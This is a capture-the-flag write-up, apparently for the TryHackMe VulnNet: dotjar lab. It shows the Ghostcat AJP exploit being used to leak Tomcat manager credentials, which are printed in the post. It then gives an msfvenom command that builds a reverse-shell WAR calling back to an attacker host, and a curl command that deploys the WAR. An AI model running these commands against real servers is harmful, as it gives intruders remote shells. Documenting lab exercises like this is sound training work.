---
title: Vulnet dotjar
layout: post
author: Bit Criminals Team
date: 2021-05-12 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/vulnnetdotjar
---

Let's start our daily routine nmap scan:

![](/images/dotjar1.png)

So, we get a 8009 port and a 8080 port on which Apache Tomcat is running.Well,the 8009 was new to me at least.

I then ran gobuster for port 8080 and here's what I got

![](/images/dotjar4.png)

I tried to login to the /manager/ directory but it asked for username and password.I was able to login to /host-manager/ but it was of no help.

After searching a bit,I finally found a help 
from my bestie-Google.I found a article about a exploit named **Ghostcat** CVE-2020-1938.

```https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp```

Then,I searched for this exploit with searchsploit and look I found a python script:multiple/webapps/48143.py 

![](/images/dotjar2.png)

Finally I ran the python script.

```python 48143.py <boxip>```

![](/images/dotjar3.png)

and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted. 

Then,again I started to look for some exploits to hack the Tomcat apache server running in port 8080
and google again prove it's supremacy.

https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

Reading this article I understood that we had to create a reverse shell and then upload it to port 8080.
I also understood that the exploit must be a war file.Here's what I came up with msfvenom. 

```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=1234 -f war > shell.war```

Then, I uploaded it with curl command as follows

``` curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war  "http://ip:8080/manager/text/deploy?path=/monshell"```

Listening to the given port,1234 as given in the exploit in this case,I opened the /monshell/ directory in which I had uploaded the shell.

And,yes we get a shell and I was logged in as 'web'

![](/images/dotjar5.png)
